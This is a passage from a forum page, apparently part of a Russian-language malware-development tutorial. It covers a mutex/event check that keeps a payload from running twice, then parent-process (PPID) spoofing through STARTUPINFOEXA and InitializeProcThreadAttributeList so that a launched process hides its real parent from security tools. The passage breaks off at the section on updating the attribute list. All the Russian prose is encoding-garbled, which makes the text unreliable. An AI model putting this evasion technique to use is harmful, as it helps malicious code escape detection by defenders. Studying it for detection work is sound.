–º—å—é—Ç–µ–∫—Å –Ω–µ –±—É–¥–µ—Ç —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω. –ï—Å–ª–∏ –º—å—é—Ç–µ–∫—Å –Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω, –ø–æ—Ç–æ–∫ –±–ª–æ–∫–∏—Ä—É–µ—Ç –µ–≥–æ, –≤—ã–ø–æ–ª–Ω—è–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å –æ–±—â–∏–º —Ä–µ—Å—É—Ä—Å–æ–º –∏ –∑–∞—Ç–µ–º —Ä–∞–∑–±–ª–æ–∫–∏—Ä—É–µ—Ç –º—å—é—Ç–µ–∫—Å –ø–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏. –≠—Ç–æ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –æ–±—â–µ–º—É —Ä–µ—Å—É—Ä—Å—É —Ç–æ–ª—å–∫–æ –æ–¥–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –∑–∞ —Ä–∞–∑, –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—è –∫–æ–Ω—Ñ–ª–∏–∫—Ç—ã –∏ –ø–æ—Ä—á—É –¥–∞–Ω–Ω—ã—Ö.<br />
<br />
CreateMutexA –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∏–º–µ–Ω–æ–≤–∞–Ω–Ω–æ–≥–æ –º—å—é—Ç–µ–∫—Å–∞ —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hMutex = CreateMutexA(NULL, FALSE, &quot;ControlString&quot;);

if (hMutex != NULL &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS)
    // –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è
else
    // –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è</code></pre>
	</div>
</div><br />
<b>–°–æ–±—ã—Ç–∏—è</b><br />
<br />
–°–æ–±—ã—Ç–∏—è - —ç—Ç–æ –µ—â–µ –æ–¥–∏–Ω –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –∫–æ–æ—Ä–¥–∏–Ω–∞—Ü–∏–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤ –∏–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤. –û–Ω–∏ –º–æ–≥—É—Ç –±—ã—Ç—å —Ä—É—á–Ω—ã–º–∏ –∏–ª–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–º–∏, –ø—Ä–∏—á–µ–º —Ä—É—á–Ω—ã–µ —Å–æ–±—ã—Ç–∏—è —Ç—Ä–µ–±—É—é—Ç —è–≤–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π –ø–æ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –∏–ª–∏ —Å–±—Ä–æ—Å—É, –∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —Å–æ–±—ã—Ç–∏—è –∞–∫—Ç–∏–≤–∏—Ä—É—é—Ç—Å—è –≤–Ω–µ—à–Ω–∏–º–∏ —É—Å–ª–æ–≤–∏—è–º–∏, —Ç–∞–∫–∏–º–∏ –∫–∞–∫ –∏—Å—Ç–µ—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ —Ç–∞–π–º–µ—Ä–∞ –∏–ª–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –∑–∞–¥–∞—á–∏.<br />
<br />
–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å–æ–±—ã—Ç–∏–π –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è WinAPI CreateEventA. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –Ω–∏–∂–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, &quot;ControlString&quot;);

if (hEvent != NULL &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS)
    // –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è
else
    // –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è</code></pre>
	</div>
</div><br />
<b><u>–•–æ—á–µ—Ç—Å—è –æ—Ç–º–µ—Ç–∏—Ç—å —á—Ç–æ –≤—ã—à–µ –∫–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –Ω–µ —Å–æ–≤—Å–µ–º –ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ–±—ä–µ–∫—Ç—ã —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏, –∞ –ø—Ä–∏–∑–≤–∞–Ω –ª–∏—à—å –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏, –¥–ª—è –±–æ–ª—å—à–µ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è –∫–∞–∫ —Å –Ω–∏–º–∏ —Ä–∞–±–æ—Ç–∞—Ç—å, —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –æ–±—Ä–∞—Ç–∏—Ç—Å—è –ª–∏–±–æ –∫ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft, –ª–∏–±–æ –ø–æ–∏—Å–∫–∞—Ç—å —Å—Ç–∞—Ç—å–∏ –ø–æ –æ–±—ä–µ–∫—Ç–∞–º —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏.</u></b><br />
<br />
–í–æ—Ç –Ω–∞–ø—Ä–∏–º–µ—Ä —Å–µ–º–∞—Ñ–æ—Ä—ã, –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å —Å–æ–±—ã—Ç–∏—è–º–∏:WaitForSingleObject (–ü–æ—Ç–æ–∫–∏ –æ–∂–∏–¥–∞—é—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Ä–∞–∑–¥–µ–ª—è–µ–º–æ–º—É —Ä–µ—Å—É—Ä—Å—É).<br />
–ê –¥–ª—è —Ä–∞–±–æ—Ç—ã –º—å—é—Ç–µ–∫—Å–∞–º–∏ –Ω–∞–ø—Ä–∏–º–µ—Ä –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞—Ö–≤–∞—Ç–∞ –∏ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è –º—å—é—Ç–µ–∫—Å–∞.<br />
<br />
–ò–∑—É—á–∏—Ç—å —ç—Ç–∏ —Ç–µ–º—ã –ø—Ä–µ–¥–ª–∞–≥–∞—é —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ, —Ç.–∫. –º–∞—Ç–µ—Ä–∏–∞–ª–∞ –æ—á–µ–Ω—å –º–Ω–æ–≥–æ –ø–æ —ç—Ç–æ–π —á–∞—Å—Ç–∏.)</div>
						

							<h2>–ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Spoofing</h2>

							

							

							<div class="bbWrapper">Spoofing - –í –ø–µ—Ä–µ–≤–æ–¥–µ –ø–æ–¥–º–µ–Ω–∞.)<br />
<br />
<b>–†–∞—Å—Å–º–æ—Ç—Ä–∏–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ —Ç–µ—Ö–Ω–∏–∫–∏:<br />
–ü–æ–¥–º–µ–Ω–∞ –Ω–æ–º–µ—Ä–∞ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ (PPID)</b><br />
<br />
–≠—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è PPID –ø—Ä–æ—Ü–µ—Å—Å–∞, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –º–∞—Å–∫–∏—Ä–æ–≤–∞—Ç—å —Å–≤—è–∑—å –º–µ–∂–¥—É –¥–æ—á–µ—Ä–Ω–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º –∏ –µ–≥–æ –∏—Å—Ç–∏–Ω–Ω—ã–º —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, –∏–∑–º–µ–Ω–∏–≤ PPID –¥–æ—á–µ—Ä–Ω–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–∞ –¥—Ä—É–≥–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –∑–∞—Å—Ç–∞–≤–∏–≤ –µ–≥–æ –≤—ã–≥–ª—è–¥–µ—Ç—å —Ç–∞–∫, –∫–∞–∫ –±—É–¥—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –±—ã–ª –∑–∞–ø—É—â–µ–Ω –¥—Ä—É–≥–∏–º –∑–∞–∫–æ–Ω–Ω—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º Windows, –∞ –Ω–µ –∏—Å—Ç–∏–Ω–Ω—ã–º —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.<br />
<br />
–†–µ—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –∑–∞—â–∏—Ç–Ω–∏–∫–∏ —á–∞—Å—Ç–æ –∏—â—É—Ç –Ω–µ–æ–±—ã—á–Ω—ã–µ –æ—Ç–Ω–æ—à–µ–Ω–∏—è –º–µ–∂–¥—É —Ä–æ–¥–∏—Ç–µ–ª–µ–º –∏ —Ä–µ–±–µ–Ω–∫–æ–º. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ Microsoft Word –∑–∞–ø—É—Å–∫–∞–µ—Ç cmd.exe, —ç—Ç–æ –æ–±—ã—á–Ω–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω—ã—Ö –º–∞–∫—Ä–æ—Å–æ–≤. <b>–ï—Å–ª–∏ cmd.exe –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å –¥—Ä—É–≥–∏–º PPID, –æ–Ω —Å–∫—Ä–æ–µ—Ç –∏—Å—Ç–∏–Ω–Ω—ã–π —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å –∏ –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å —Ç–∞–∫, –∫–∞–∫ –±—É–¥—Ç–æ –æ–Ω –±—ã–ª –∑–∞–ø—É—â–µ–Ω –¥—Ä—É–≥–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.</b><br />
<br />
–í–æ—Ç –Ω–∞–ø—Ä–∏–º–µ—Ä –≤ —Å—Ç–∞—Ç—å–µ –ø—Ä–æ APC, RuntimeBroker.exe –±—ã–ª –∑–∞–ø—É—â–µ–Ω  —Ä–æ–¥–∏—Ç–µ–ª–µ–º EarlyBird.exe, —á—Ç–æ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ä–µ—à–µ–Ω–∏—è–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783972655.png"
		data-src="https://osint42.org/attachments/1746783972655-png.161/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783972655-png.161/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783972655.png"
			title="1746783972655.png"
			width="1332" height="754" loading="lazy" />
	</div><br />
<br />
<b>–°–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤</b><br />
<br />
–°–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ ‚Äî —ç—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö, –∫–æ—Ç–æ—Ä–∞—è —Ö—Ä–∞–Ω–∏—Ç —Å–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤, —Å–≤—è–∑–∞–Ω–Ω—ã—Ö —Å –ø—Ä–æ—Ü–µ—Å—Å–æ–º –∏–ª–∏ –ø–æ—Ç–æ–∫–æ–º. –ö —ç—Ç–∏–º –∞—Ç—Ä–∏–±—É—Ç–∞–º –º–æ–≥—É—Ç –æ—Ç–Ω–æ—Å–∏—Ç—å—Å—è —Ç–∞–∫–∏–µ —Å–≤–µ–¥–µ–Ω–∏—è, –∫–∞–∫ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç, –∞–ª–≥–æ—Ä–∏—Ç–º –ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è, —Å–æ—Å—Ç–æ—è–Ω–∏–µ, –ø—Ä–∏–≤—è–∑–∫–∞ –∫ –¶–ü, –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –ø–æ—Ç–æ–∫–∞ –∏ –º–Ω–æ–≥–æ–µ –¥—Ä—É–≥–æ–µ. –°–ø–∏—Å–∫–∏ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ —Ö—Ä–∞–Ω–µ–Ω–∏—è –∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö –∏ –ø–æ—Ç–æ–∫–∞—Ö, –∞ —Ç–∞–∫–∂–µ –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –ø–æ—Ç–æ–∫–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏.<br />
<br />
–î–ª—è PPID Spoofing —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –µ–≥–æ PPID. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –ø—Ä–æ—Ü–µ—Å—Å–∞ –±—É–¥—É—Ç –ø–æ–∫–∞–∑–∞–Ω—ã –≤ —Å–ª–µ–¥—É—é—â–∏—Ö —Ä–∞–∑–¥–µ–ª–∞—Ö.<br />
<br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞</b><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å –ø–æ–¥–º–µ–Ω—ã PPID —Ç—Ä–µ–±—É–µ—Ç —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º CreateProcess —Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º —Ñ–ª–∞–≥–æ–º EXTENDED_STARTUPINFO_PRESENT, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª—è —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –≠—Ç–æ—Ç —Ñ–ª–∞–≥ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏–∑–º–µ–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ü–µ—Å—Å–µ, —Ç–∞–∫—É—é –∫–∞–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é PPID.<br />
<br />
–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è Microsoft –ø–æ EXTENDED_STARTUPINFO_PRESENT –≥–ª–∞—Å–∏—Ç —Å–ª–µ–¥—É—é—â–µ–µ:<br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–µ—Ç—Å—è —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –∑–∞–ø—É—Å–∫–µ; –ø–∞—Ä–∞–º–µ—Ç—Ä lpStartupInfo –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É STARTUPINFOEX.<br />
<br />
–≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —Ç–∞–∫–∂–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö STARTUPINFOEXA.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ STARTUPINFOEXA</b><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö STARTUPINFOEXA –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList; // –°–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;</code></pre>
	</div>
</div><br />
StartupInfo ‚Äî —ç—Ç–æ —Ç–∞ –∂–µ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞—Å—å –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –û–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ —Å—Ç–∞—Ç—å–µ <a href="https://ru-sfera.pw/threads/razrabotka-virusov-19-izuchaem-texniku-apc-injection.4451/" target="_blank" class="link link--external" rel="noopener">–ø—Ä–æ APC</a> –¥–ª—è –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏—è.<br />
–ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å, —ç—Ç–æ cb, —Ä–∞–≤–Ω—ã–π sizeof(STARTUPINFOEX).<br />
<br />
lpAttributeList —Å–æ–∑–¥–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI InitializeProcThreadAttributeList. –≠—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤, –∫–æ—Ç–æ—Ä–∞—è –æ–±—Å—É–∂–¥–∞–µ—Ç—Å—è –ø–æ–¥—Ä–æ–±–Ω–µ–µ –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ä–∞–∑–¥–µ–ª–µ.<br />
<br />
<b>–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è InitializeProcThreadAttributeList –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeProcThreadAttributeList(
  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwAttributeCount,
                  DWORD                        dwFlags,         // NULL (–∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–æ)
  [in, out]       PSIZE_T                      lpSize
);</code></pre>
	</div>
</div><br />
–ß—Ç–æ–±—ã –ø–µ—Ä–µ–¥–∞—Ç—å —Å–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤, –∫–æ—Ç–æ—Ä—ã–π –∏–∑–º–µ–Ω—è–µ—Ç —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –¥–æ—á–µ—Ä–Ω–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Å–Ω–∞—á–∞–ª–∞ —Å–æ–∑–¥–∞–π—Ç–µ —Å–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI InitializeProcThreadAttributeList. –≠—Ç–æ—Ç API –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç —É–∫–∞–∑–∞–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –ø–æ—Ç–æ–∫–∞. –°–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft, InitializeProcThreadAttributeList –¥–æ–ª–∂–µ–Ω –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –¥–≤–∞–∂–¥—ã:<br />
<ol>
<li data-xf-list-type="ol">–ü–µ—Ä–≤—ã–π –≤—ã–∑–æ–≤ InitializeProcThreadAttributeList –¥–æ–ª–∂–µ–Ω –∏–º–µ—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ NULL –¥–ª—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ lpAttributeList. –≠—Ç–æ—Ç –≤—ã–∑–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ä–∞–∑–º–µ—Ä–∞ —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω –∏–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ lpSize.</li>
<li data-xf-list-type="ol">–í—Ç–æ—Ä–æ–π –≤—ã–∑–æ–≤ InitializeProcThreadAttributeList –¥–æ–ª–∂–µ–Ω —É–∫–∞–∑–∞—Ç—å –¥–µ–π—Å—Ç–≤—É—é—â–∏–π —É–∫–∞–∑–∞—Ç–µ–ª—å –¥–ª—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ lpAttributeList. –ó–Ω–∞—á–µ–Ω–∏–µ lpSize —Å–ª–µ–¥—É–µ—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –Ω–∞ —ç—Ç–æ—Ç —Ä–∞–∑ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –≤–≤–æ–¥–∞. –≠—Ç–æ—Ç –≤—ã–∑–æ–≤ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç —Å–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤.</li>
</ol>dwAttributeCount –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ 1, —Ç–∞–∫ –∫–∞–∫ –Ω—É–∂–µ–Ω —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Å–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤.<br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤</b><br />
<br />
